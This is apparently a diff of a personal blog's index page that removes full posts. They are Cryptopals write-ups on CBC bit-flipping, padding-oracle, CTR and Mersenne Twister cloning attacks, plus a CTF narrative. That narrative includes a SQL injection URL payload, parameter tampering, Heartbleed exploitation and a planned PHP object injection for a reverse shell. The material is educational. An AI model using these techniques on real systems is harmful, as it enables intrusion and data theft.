-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> cand <span class="keyword">in</span> candidates:</div><div class="line">  table_key = oracle(offset + knownbytes + cand)[prefix_location: prefix_location + len(offset) + len(knownbytes) + <span class="number">1</span>]</div></pre></td></tr></table></figure></p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">    |--lookup table key---------|</div><div class="line">RRRRRAAAAAAAAAAA AAAAAAAAAAAAAAAU UUUU.....</div></pre></td></tr></table></figure></p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">    |-------------------lookup table key---------|  </div><div class="line">    |---offset-------|</div><div class="line"></div><div class="line">extra_offset_for_prefix</div><div class="line">    |          |</div><div class="line">RRRRRAAAAAAAAAAA AAAAAKKKKKKKKKKK KKKKKKKKKKKKKKKU UUUU.....</div></pre></td></tr></table></figure></p>
-<p>Calling <code>find_next_byte_with_prefix</code> byte-by-byte, I find the same flag as before.
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Rollin<span class="string">' in my 5.0\nWith my rag-top down so my hair can blow\nThe girlies on standby waving just to say hi\nDid you stop? No, I just drove by\n</span></div></pre></td></tr></table></figure></p>
-<h2>Challenge 15 PKCS#7 padding validation</h2>
-<p>Here's an easy one. We need only validate that the PKCS7 padding is correct.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">byte = s[<span class="number">-1</span>]</div><div class="line">pad_length = unpack(byte, <span class="string">'all'</span>)</div><div class="line"><span class="keyword">if</span> byte == <span class="number">0</span> <span class="keyword">or</span> s[-pad_length:] != byte * pad_length <span class="keyword">or</span> byte == <span class="string">""</span>:</div></pre></td></tr></table></figure></p>
-<p>I check if the last <code>pad_length</code> bytes of <code>s</code> are equal to the string of <code>byte</code> repeated <code>pad_length</code> times, as it should be in a properly padded string.</p>
-<h2>Challenge 16 CBC bitflipping attacks</h2>
-<p>We have a function that takes user input and url-encodes special characters, and we want to exploit the properties of CBC to allow us to insert the string &quot;;admin=true;&quot; without the &quot;;&quot; and &quot;=&quot; being validated out.</p>
-<p>Recall that CBC takes each block of ciphertext and XORs it with the next block of decrypted ciphertext to recover the plaintext.</p>
-<p>If I can modify at least two consecutive blocks of ciphertext, I can make the second block decrypt to whatever I want.</p>
-<p>I know that <code>\x00 ^ \x59 = ;</code> and <code>\x00 ^ \x61 = '='</code> from <a href="http://www.nthelp.com/ascii.htm" target="_blank" rel="external">ascii chart</a>.</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">user-controlled input:</div><div class="line">      0                     1</div><div class="line">AAAAAAAAAAAAAAAA  \x00admin\x00true\x00</div><div class="line"></div><div class="line">ciphertext:</div><div class="line">XXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXX</div><div class="line"></div><div class="line">modified ciphertext:</div><div class="line">\x59XXXXX\x61XXXX\x59XXXX XXXXXXXXXXXXXXXX</div><div class="line"></div><div class="line">In XOR step of CBC decryption, the 2nd block would normally XOR to recover \x00admin\x00true\x00, but now that I&apos;ve done an additional XOR on three bytes by modifying ciphertext, the 2nd block XORs to a plaintext of \x59admin\x61true\x59.</div></pre></td></tr></table></figure></p>
-<p>Done with set2!</p>
-
+        <p>For the first lab in 6.035, Computer Language Engineering, in Spring 2017, we use Flex, a lexical analyzer library, and Bison, a parser generator, to create a parser for a simple scripting language.</p>
+<p>The grammar for the language is shown below.</p>
+        <!-- For the first lab in 6.035, Computer Language Engineering, in Spring 2017, we use Flex, a lexical analyzer library, and Bison, a parser generator, to create a parser for a simple scripting language......  -->
+        <p class="article-more-link">
+          <a href="/2017/03/07/Flex-and-Bison-for-a-simple-language-MITScript/#more">Read More</a>
+        </p>
       
     </div>
     
@@ -758,97 +460,11 @@ I then normalize the Hamming distance for keysize.
         <h2>Challenge 17 The CBC padding oracle!!!!!</h2>
 <p>The CBC padding oracle is a very famous attack. We have an oracle function that takes in a ciphertext and decrypts it, returning <code>True</code> if the plaintext is padded properly.</p>
 <p>The process behind the attack on each block is:</p>
-<p>&lt;!-- more --&gt;</p>
-<ol>
-<li>For each byte, starting at the last position, modify the ciphertext in the previous block, cycling through all 256 possibilities for the plaintext until I find the correct one. Here's the explanation of how I make and check my guesses.</li>
-</ol>
-<p>For the currently examined block, remember that I can modify the previous block's ciphertext, which will be XORed with this block's intermediate state to get a modified plaintext. What is the goal for the modified plaintext? It's to get the proper padding bytes at the end of it!</p>
-<p>So, to decrypt the last byte of the block, I first provide the correct offset</p>
-<p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">new_ciphertext, C':</div><div class="line">block -2                -1</div><div class="line">AAAAAAAAAAAAAAAZ XXXXXXXXXXXXXXXU</div></pre></td></tr></table></figure></p>
-<p>If I cleverly choose the value of Z, then the last byte of C', <code>U</code> above, will XOR to the correct padding byte, <code>\x01</code>.</p>
-<p>I XOR out the corresponding byte from the ciphertext, XOR out a guess for the flag byte character, and XOR in the desired padding byte (<code>\x01</code>).</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pad_str = offset_pad + xor(prev_block[-desired_padding_byte], cand_ord, desired_padding_byte)</div></pre></td></tr></table></figure></p>
-<p>I create the <code>new_ciphertext C'</code> by inserting my crafted block <code>C[-2]'</code> before the block I'm currently examining.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">new_ciphertext = ciphertext[:<span class="number">-32</span>] + pad_str + ciphertext[<span class="number">-16</span>:]</div></pre></td></tr></table></figure></p>
-<p>If my guess is correct, then only <code>\x01</code> will be left, and <code>padding_oracle(new_ciphertext)</code> will return <code>True</code>.</p>
-<ol start="2">
-<li>If I'm not examining the last character in the block, then the desired padding bytes will be something greater than <code>\x01</code>. I modify the following ciphertext bytes I've already solved to XOR out the ciphertext byte, XOR out the <strong>known</strong> flag bytes, and XOR in the desired padding byte (<code>\x02 - \xF</code>).</li>
-</ol>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pad_str = pad_str + xor(prev_block[-desired_padding_byte+<span class="number">1</span>:], known_last_bytes, desired_padding_byte) <span class="keyword">if</span> len(known_last_bytes) &gt; <span class="number">0</span> <span class="keyword">else</span> pad_str</div></pre></td></tr></table></figure></p>
-<p>As before, the correct guess will cause the byte of interest to XOR to the proper padding byte, and <code>padding_oracle(new_ciphertext)</code> will return <code>True</code>.</p>
-<p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">new_ciphertext, C':</div><div class="line">block -2                -1</div><div class="line">AAAAAAAAAAAAAAZK XXXXXXXXXXXXXXUK</div></pre></td></tr></table></figure></p>
-<p>Above, I want the plaintext bytes at positions <code>UK</code> to decrypt to <code>\x02\x02</code>. Modifying <code>K</code> to decrypt to <code>\x02</code> is simple because I already know the byte and can fully control what to XOR in or out.</p>
-<p><em>Note:</em> The 'previous ciphertext' block for the first block is the IV, so we perform the XORs on it the same way we would modify any other block.</p>
-<p>The wrapper function, <code>padding_oracle_attack(padding_oracle, ciphertext, blocksize)</code>, will loop through calls to <code>decipher_block</code> to find the last block, append the found bytes to the flag, and on the next iteration, slice out the blocks of ciphertext I've already solved.</p>
-<h2>Challenge 18</h2>
-<p>This challenge is to implement CTR (Counter) stream cipher mode. CTR mode does not encrypt the plaintext — rather, it encrypts a running stream of counter bytes, which is then XORed with the plaintext.</p>
-<p>One benefit of CTR mode is that it does not require padding.</p>
-<p><img src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Ctr_encryption.png" alt="CTR encryption"></p>
-<p><img src="https://upload.wikimedia.org/wikipedia/commons/3/34/Ctr_decryption.png" alt="CTR Decryption"></p>
-<p>I define a <code>CTR()</code> class in <code>set3_utils</code>. Decryption is identical to encryption. In <code>encrypt</code>, I generate the keystream, in 128 byte chunks, for all of my plaintext, which looks like</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">keyblock = e.update(p64(self.nonce, <span class="string">'little'</span>) + p64(self.counter, <span class="string">'little'</span>))</div><div class="line">keystream += keyblock</div></pre></td></tr></table></figure></p>
-<p>These are pwntools packing functions, packing the counter in little-endian format. The nonce is a random, secret value that composes the first 64 bytes of every keystream block.</p>
-<p>After XORing my keystream with the plaintext, I save the unused keystream bytes in <code>self.carry_over_bytes</code>. The next time I run <code>decrypt()</code> or <code>encrypt()</code>, I set <code>keystream = self.carry_over_bytes</code> so I use all the bytes of previously-generated keystreams.</p>
-<h2>Challenge 19 Break fixed-nonce CTR mode using substitutions</h2>
-<h2>Challenge 20 Break fixed-nonce CTR statistically</h2>
-<p>In this challenge, using a fixed-nonce for CTR will essentially boil down to solving repeating-key XOR, where the repeating-key is the reused ciphertext of the CTR keystream.</p>
-<p>I know that each encrypted text has been XORed with the same keystream. I first pad each encrypted text with 0's to the same length (anything longer than the longest line).</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">padded_encrypted_texts = [text.ljust(max_length, <span class="string">'0'</span>) <span class="keyword">for</span> text <span class="keyword">in</span> encrypted_texts]</div></pre></td></tr></table></figure></p>
-<p>Then, I can simply concatenate all the ciphertexts into one long string, as if a repeating-xor-key of length max_length had been applied.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">keystream = breakRepeatingXor(<span class="string">""</span>.join(padded_encrypted_texts), max_length)</div></pre></td></tr></table></figure></p>
-<p>The result will be a keystream that, when XORed with each encrypted text, should produce mostly readable text. The accuracy towards the end of the longer strings will degrade, because there is not enough information to determine the correct key — there are simply not enough strings near the maximum length to determine the key based on letter frequency.</p>
-<h2>Challenge 21 Implement the MT19937 Mersenne Twister RNG</h2>
-<p>The Mersenne Twister is by far the most common PRNG (pseudo-random number generator). The most common version is based on the Mersenne prime 2&lt;sup&gt;19937&lt;/sup&gt;−1, and has a known set of constants and magic values.</p>
-<p><img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Mersenne_Twister_visualisation.svg" alt="Mersenne visualization"></p>
-<p>There are three main components of MT19937, 32-bit values.</p>
-<ol>
-<li>Initialization of the first set of 624 values from a seed</li>
-<li>Outputting the next number from the RNG, after some tempering</li>
-<li>Generating a new set of 624 values (twisting)</li>
-</ol>
-<p>In step 1, we initialize the <code>self.state</code> array by setting the first value to be the seed, and then calculating the rest from the formula off Wikipedia, <code>x[i] = f × (x[i-1] ⊕ (x[i-1] &gt;&gt; (w-2))) + i</code>, where w is the word size, 32 bits.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">624</span>):</div><div class="line">	self.state[i] =  self.int32(f * (self.state[i<span class="number">-1</span>] ^ (self.state[i<span class="number">-1</span>] &gt;&gt; <span class="number">30</span>)) + i)</div></pre></td></tr></table></figure></p>
-<p>where <code>f</code> is a magic, <code>1812433253</code>.</p>
-<p>In step 2, the RNG outputs a number by taking the next state value, indexed by <code>self.index</code>, and applying some temper transforms before returning it. Then, we increment <code>self.index</code> to use the next state value next time.</p>
-<p>When we have used up 624 values, we &quot;twist&quot; to generate more.</p>
-<p><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/c1448dcf56263ba3a393fad35ef06fbd1618df04" alt="Mersenne twist"></p>
-<p>For each state value, the RNG concats the MSB of the current state value and the other 31 bits from the next state value.
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">y = (self.state[i] &amp; <span class="number">0x80000000</span>) + (self.state[(i+<span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>)</div></pre></td></tr></table></figure></p>
-<p>Then it does the A transform above: right-shifts by one, and XORing an additional magic if the current state value is odd.  We also XOR with the 397th-next former state variable.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">self.state[i] = self.state[(i+<span class="number">397</span>) % <span class="number">624</span>] ^ (y&gt;&gt;<span class="number">1</span>)</div></pre></td></tr></table></figure></p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</div><div class="line">  <span class="comment"># if odd, xor with another magic number</span></div><div class="line">  self.state[i] ^= <span class="number">0x9908b0df</span></div></pre></td></tr></table></figure></p>
-<h2>Challenge 22 Crack an MT19937 seed</h2>
-<h2>Challenge 23 Clone an MT19937 RNG from its output</h2>
-<p>TO clone an MT19937 RNG, we need to find its 624-value internal state. We need to get 624 RNG outputs, and untemper each one.</p>
-<p>The untempering is very tricky — remember that we did this sequence of two right shifts and two left-shift ANDs:
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">temp ^= (temp &gt;&gt; <span class="number">11</span>)</div><div class="line">temp ^= (temp &lt;&lt; <span class="number">7</span>) &amp; <span class="number">2636928640</span></div><div class="line">temp ^= (temp &lt;&lt; <span class="number">15</span>) &amp; <span class="number">4022730752</span></div><div class="line">temp ^= (temp &gt;&gt; <span class="number">18</span>)</div></pre></td></tr></table></figure></p>
-<p>Let's see how to undo that right shift:</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">10110111010111110001000011001110</span> ^</div><div class="line"><span class="number">00000000000000000010110111010111</span> (&gt;&gt;<span class="number">18</span>)</div><div class="line">=</div><div class="line"><span class="number">10110111010111110011110100011001</span></div></pre></td></tr></table></figure></p>
-<p>We iterate through all the bits of the output, starting from the leftmost bit</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>):</div><div class="line">  output_bit = getBit(binary_str, i)</div><div class="line"></div><div class="line">  recovered_bit = output_bit ^ getBit(orig_bits, i - shift)</div><div class="line">  <span class="comment"># set the bit at index i in the orig_bits to be the recovered bit</span></div><div class="line">  orig_bits = setBit(orig_bits, i, recovered_bit)</div></pre></td></tr></table></figure></p>
-<p>While <code>i &lt; shift</code>, getBit() will return 0 as the XOR bit, and <code>recovered_bit</code> will just be the same as the output bit. When <code>i = shift</code>, <code>orig_bits</code> will contain the first <code>shift</code> original bits. <code>getBit(orig_bits, i - shift)</code> will emulate the right-shifted original value, grabbing original bit values, starting from the left of <code>orig_bits</code>. Thus, the XOR of the <code>output_bit</code> and the corresponding index of <code>orig_bits</code> will recover the next original bit.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">When i = <span class="number">18</span></div><div class="line"></div><div class="line">output:</div><div class="line"></div><div class="line">              <span class="number">18</span>___</div><div class="line">                  |</div><div class="line"><span class="number">10110111010111110011110100011001</span></div><div class="line"></div><div class="line">orig_bits:</div><div class="line"><span class="number">101101110101111100</span></div><div class="line"></div><div class="line">recovered_bit:</div><div class="line">output[<span class="number">18</span>] ^ orig_bits[<span class="number">0</span>]</div><div class="line">    <span class="number">1</span>      ^    <span class="number">1</span>         = <span class="number">0</span></div></pre></td></tr></table></figure></p>
-<p>Note that, if <code>shift &lt; 16</code>, at some point each recovered original bit is used immediately in the next iteration of the for loop to recover the next bit.</p>
-<p>To untemper the left shift + and + xor, we reconstruct the original from the right side, not the left.</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">                    24---</div><div class="line">                        |</div><div class="line">                        \/      </div><div class="line">1011011101011111000100001 1001110 ^ (&lt;--orig_bits)</div><div class="line">1010111110001000011001110 0000000 (&lt;&lt; 7) =</div><div class="line">__________________________________</div><div class="line">0001100011010111011101111 1001110 &amp;</div><div class="line">1001110100101100010101101 0000000 (&lt;--2636928640 magic) =</div><div class="line">__________________________________</div><div class="line">0001100000000100010101101 0000000 output_bits</div></pre></td></tr></table></figure></p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reversed(xrange(<span class="number">32</span>)):</div><div class="line">  output_bit = getBit(binary_str, i)</div><div class="line"></div><div class="line">  undo_xor_bit = getBit(orig_bits, i + shift) &amp; getBit(and_val, i)</div><div class="line">  recovered_bit = output_bit ^ undo_xor_bit</div><div class="line">  orig_bits = setBit(orig_bits, i, recovered_bit)</div></pre></td></tr></table></figure></p>
-<p>While <code>i + shift &gt; 31</code>, the <code>undo_xor_bit</code> is <code>0</code>, so the last <code>shift</code> bits of <code>orig_bits</code> are identical to the last <code>shift</code> output_bits.</p>
-<p>Once <code>i &lt;= 31-shift</code>, we begin using values from the right side of <code>orig_bits</code>, emulating the left-shifted value. We then &amp; in the magic bit, and XOR with the output bit to recover the next original bit.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">When i = <span class="number">24</span></div><div class="line"></div><div class="line">undo_xor_bit:</div><div class="line">orig_bits[<span class="number">31</span>] &amp; and_value[<span class="number">24</span>]</div><div class="line">      <span class="number">0</span>              <span class="number">1</span>       = <span class="number">0</span></div><div class="line"></div><div class="line">recovered_bit:</div><div class="line">output[<span class="number">24</span>] ^ undo_xor_bit =</div><div class="line">    <span class="number">1</span>      ^     <span class="number">0</span>        =  <span class="number">1</span></div></pre></td></tr></table></figure></p>
-<p>Our final <code>untemper</code> function is just reversing the 4 tempers,
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">untemper</span><span class="params">(val)</span>:</span></div><div class="line">	val = unRightShiftXor(val, <span class="number">18</span>)</div><div class="line"></div><div class="line">	val = unLeftShiftXorAnd(val, <span class="number">15</span>, <span class="number">4022730752</span>)</div><div class="line"></div><div class="line">	val = unLeftShiftXorAnd(val, <span class="number">7</span>, <span class="number">2636928640</span>)</div><div class="line"></div><div class="line">	val = unRightShiftXor(val, <span class="number">11</span>)</div></pre></td></tr></table></figure></p>
-<p>and we can easily clone an RNG's 624-value state:</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">624</span>):</div><div class="line">	rand = mt.get_number()</div><div class="line">	cloned_mt_state[i] = untemper(rand)</div></pre></td></tr></table></figure></p>
-<p>We check that a MT with the cloned state does in fact generate the same numbers as the original MT. Done!</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cloned_mt = MT19937(arbitrary value)</div><div class="line">cloned_mt.state = cloned_mt_state</div></pre></td></tr></table></figure></p>
-<h2>Challenge 24 Create the MT19937 stream cipher and break it</h2>
-<p>We first need to create an  MT19937 stream cipher, which operates much like CTR mode. The keystream, the RNG output, is simply XORed to decrypt or encrypt.</p>
-<p>We have an oracle that appends some random prefix to our plaintext before encrypting it using the MTR Stream cipher.</p>
-<p>We first find the prefix length, by simply subtracting the length of the plaintext from the len of oracle-returned ciphertext — the added length in the ciphertext must be due to the prefix, since there's no padding in a stream cipher.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Step <span class="number">1</span>:</div><div class="line">plaintext:</div><div class="line">AAAAAAAAAAAAAA</div><div class="line"></div><div class="line">encrypted <span class="keyword">in</span> oracle:</div><div class="line">|rand_prefix|</div><div class="line">|    |</div><div class="line">RRRRRR AAAAAAAAAAAAAA</div><div class="line">|len(oracle_ciphertext)|</div><div class="line"></div><div class="line"></div><div class="line">Step <span class="number">2</span>:</div><div class="line">padded:</div><div class="line">|prefix_len|</div><div class="line">|    |</div><div class="line">AAAAAA AAAAAAAAAAAAAA</div><div class="line">|len(oracle_ciphertext)|</div><div class="line"></div><div class="line">       |-COMPARE ENC-|</div></pre></td></tr></table></figure></p>
-<p>We then iterate through all possible seed values, 1...2&lt;sup&gt;16&lt;/sup&gt;. We create a MT Cipher with each seed, encrypting our <code>padded</code> data and seeing if it gives the same ciphertext as the oracle did. (Remember to slice out the random prefix when comparing!) If the ciphertexts match, we have found our seed!</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>**<span class="number">16</span>):</div><div class="line">  padded = <span class="string">'A'</span> * len(oracle_ciphertext)</div><div class="line">  <span class="keyword">if</span> MT19937Cipher(i).encrypt(padded)[prefix_len:] == oracle_ciphertext[prefix_len:]:</div><div class="line">    <span class="keyword">return</span> i</div></pre></td></tr></table></figure></p>
-
+        <!-- Challenge 17 The CBC padding oracle!!!!!
+The CBC padding oracle is a very famous attack. We have an oracle function that takes in a ciphertext and decrypts it, returning True if the plaintext is pa......  -->
+        <p class="article-more-link">
+          <a href="/2017/03/07/set3-writeup/#more">Read More</a>
+        </p>
       
     </div>
     
@@ -899,60 +515,11 @@ I then normalize the Hamming distance for keysize.
         <p><strong>This is my first writeup, written in 2015 in Word and back-dated</strong></p>
 <p>Last weekend, I took to some haxxoring in the NSA Cybersprint Competition, a Capture-The-Flag that took place on a simulated corporate network infrastructure.</p>
 <p>Here’s what it was like.</p>
-<p>&lt;!-- more --&gt;</p>
-<p>I’m in the position of a penetration tester who’s been hired to probe the major pharmaceutical company, BWP, for vulnerabilities.</p>
-<p>In five levels of increasing difficulty, I must explore and exploit an array of BWP’s internal sites. I’m testing an extensive set of abilities, including command-line savvy and knowledge of vulnerabilities and hacking tools. But what’s going to help me most is creative problem-solving. As in the real world, there are a lot of unexpected obstacles that complicate break-ins, but inventing workarounds is key to the sport.</p>
-<p>I use the Kali Linux distribution as my hacking box, which comes with a massive suite of pentesting tools pre-installed. Booting off an external drive with Kali installed, I have a hacker’s playground.</p>
-<p>On Level 1, I’m given access to our company’s webmail service and internal social network with the credentials of an unprivileged user. I’ll need to leverage this network throughout my investigation to be able to know which employees work for which teams. Without needing too much technical know-how, I navigate around the directory webpages, picking up information about the organization’s users and teams (called ‘Spaces’). I notice there’s a Sales space, an IT admin space, and a Patent space, among others.</p>
-<p>In a cute little warmup, I’m asked to craft a social-engineering attack — email a manager asking for a list of patent-holders and their patents in the most innocent way possible. Of course, only a bot responds to me, but this highlights a low-hanging fruit in real life — human beings are often the weakest link in a company’s security chain.</p>
-<p>A dozen small checkpoints later, I’m on Level 2. There’s a secret IT-only staff page that I need to get access to. As it turns out, only IT staff members can get the password to this site, by requesting the credentials from an online portal. So I log in to the portal as my unprivileged self and notice there’s an online form with my username in an uneditable input field. I tweak the page source to impersonate an IT staff member, send the form, and get an automated response with the IT-only login. Nothing fancy yet, just using the Page Inspector, which is built into browsers like Firefox and Chrome. It’s contrived, sure, but we’re only on Level 2!</p>
-<p>I login to the secret page. Now, I’m staring at the IT dashboard and a big list of tickets. Let’s look at the most recent ticket — it has to do with a closed-circuit TV (CCTV) server. But there’s a problem — ticket details are restricted to IT staff members, and I don’t have the credentials of any.</p>
-<p>Kali Linux comes with the Burp Suite, which has a host of capabilities for testing web applications. Setting up a proxy between Burp and the webpage, I can view all the requests and responses that are being sent back and forth, and I can change the contents before sending them along. To do this, I configure my browser to forward connections to Burp’s proxy port and turn on Burp’s ‘intercept’ feature.</p>
-<p>To view ticket details, it looks like I need to change this <code>show_details</code> parameter in the HTTP GET request to <code>true</code>. I use Burp to intercept my browser’s request to the web page, replacing the parameter and then forwarding the request along. The server, seeing this edited request, displays the details: “CVE-2014-0160”.</p>
-<p>What’s this? It’s a vulnerability in the OpenSSL library commonly known as Heartbleed, which is classified as a ‘buffer-overread’. This bug in a critical library for secure communications got a lot of attention in 2014 because it compromised hundreds of millions of secure web servers.</p>
-<p>When one machine on a secure channel tries to ask another if it’s still alive, it’s called the ‘heartbeat’ protocol. One side sends a payload length and payload to the other side, which reads the payload and sends it back. But, if the payload length is greater than the payload data, the responding machine will read back not just the payload, but also anything in memory stored beyond the payload data. This is due to a faulty bounds-check that doesn’t check whether the ‘payload length’ value is actually correct.</p>
-<p><img src="/images/2017/09/heartbleed.png" alt="Heartbleed xkcd"></p>
-<p>The penetration testing command-line tool Metasploit comes with a Heartbleed scanner pre-installed. A few inputs and an <code>exploit</code> command later, I’ve leaked the CCTV server’s memory and discovered a password in the leak. Now, I can log in and view video camera feeds. Level 2 is complete.</p>
-<p>Rolling right along, I now move to Level 3 in which I break into the sales team.</p>
-<p>I try to log in to the sales submission website, but I’m not a sales staff member, so no luck. It’s time to whip out Burp again to forge some parameters and masquerade as sales. This time, I replace a <code>user</code> parameter in my browser request with the username of a sales team member. It works.</p>
-<p>On the sales submission site, I notice an error log file, which naively has a set of customer credentials buried in it.</p>
-<p>With these credentials, I can get onto the Customer Relationship Management (CRM) portal. Now my SQL skills are put to the test. There’s a ‘Sales Analysis’ table on this site, whose backend is a MySQL database. It’s got a list of drug sales to different buyers and their associated dollar amounts. Some of the entries are hidden — some buyers are ‘restricted’, and I can’t see sales involving them.</p>
-<p>But it seems like the URL takes SQL queries as parameters. Sticking into the request url <code>?columns=*</code>, I’ve crafted the command <code>SELECT * FROM sales WHERE restricted=0</code>. This command shows all columns in the table, but the server adds a WHERE clause to exclude the entries where the restricted column</p>
-<p>Now, I want to get rid of that pesky <code>WHERE</code> clause so that I can view all the restricted transactions. I add to the url <code>?columns=* FROM sales; --</code>. The double hyphens out-comment everything after it, so the WHERE filter is not executed. I can see all entries, including the one company with the restricted field set to 1.</p>
-<p>We’re not quite done. The restricted company’s name is base64-encoded with a custom alphabet key, and I have to use an online service to decode the name. Moving right along.</p>
-<p>I check out Level 4. It’s all about Windows. Skip!</p>
-<p>Level 5 is by far the trickiest set of tasks.</p>
-<p>I’m given a web application for a personal pill-scheduling site called Digital Pillbox, and I need to find some way to get a reverse shell on the web server. From there, I need to exploit the remote version-control server, and finally, I have to obtain a shell on the build server. How do I get started?</p>
-<p>Well, there happens to be a .git folder in the web directory that I can access. This folder contains all information about a Git version control repository, which includes configuration, logs, etc. And I know I can recreate the source files if I have this repo. So, I use <code>wget -r --no-parents --reject ‘index.html</code> to mirror the <code>.git</code> folder to a folder on my local machine, recursively downloading the contents from the webpage.</p>
-<p>Wget is a command-line program for retrieving the contents of web servers. The <code>-r</code> option tells wget to go through all the contents of the directory recursively. The <code>--no-parents</code> prevents the parent directories of the .git folder from being downloaded. <code>--reject ‘index.html’</code> will reject a set of duplicate files starting in <code>index.html</code> that we don’t need.</p>
-<p>To recover the source files, I run a git stash in the local <code>.git</code> folder. The source code is a set of PHP scripts for enrolling users, creating users, and logging in to the web app. There’s also a cookies.inc file, which contains PHP code to generate HTTP cookies for app authentication.</p>
-<p>I have to perform the most difficult task in the competition — a PHP object injection. Basically, I craft a cookie in which I’ve embedded some arbitrary commands and send it to the web app. The app will execute the commands, which will give me a reverse shell.</p>
